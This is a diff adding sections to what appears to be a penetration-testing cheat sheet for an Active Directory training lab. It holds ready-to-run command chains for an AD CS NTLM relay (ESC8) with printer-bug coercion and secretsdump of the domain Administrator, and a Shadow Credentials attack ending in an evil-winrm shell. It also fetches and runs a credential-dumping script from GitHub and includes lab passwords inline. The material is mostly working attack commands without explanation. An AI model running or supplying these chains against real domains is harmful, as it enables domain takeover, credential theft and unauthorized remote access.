@@ -387,3 +387,32 @@ dir \\dc01\julio
 wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 /opt/linikatz.sh
 ```
+
+## AD CS NTLM Relay Attack (ESC8)
+```bash
+impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+
+# trigger
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+
+export KRB5CCNAME=/tmp/dc.ccache
+
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+```bash
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+
+export KRB5CCNAME=/tmp/jpinkman.ccache
+
+klist
+
+cat /etc/krb5.conf
+
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
